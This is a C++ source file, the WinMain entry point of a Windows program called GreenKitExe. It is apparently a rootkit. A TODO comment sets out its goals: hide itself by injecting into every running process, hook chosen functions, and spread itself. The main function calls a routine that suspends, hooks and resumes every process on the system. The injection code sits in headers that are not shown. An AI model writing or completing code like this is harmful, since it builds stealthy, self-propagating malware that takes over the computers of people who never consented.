// GreenKitExe.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "GreenKitExe.h"
#include "process.h"
#include "Injector.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>

// Global Variables:
HINSTANCE hInst;								// current instance

// Forward declarations of functions included in this code module:
//ATOM				MyRegisterClass(HINSTANCE hInstance); *** KEPT ONLY AS EXAMPLE ***



int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	hInst = hInstance;

	/* TODO :
		Run the core of GreenKitExe :
			Hide ourself : Inject ourself to every process running on the system and hook desired functions
			Spread ourself
	*/

	// Run through every process of the system
    process_allSuspendApplyResume(HookProcess);
	return 0;
}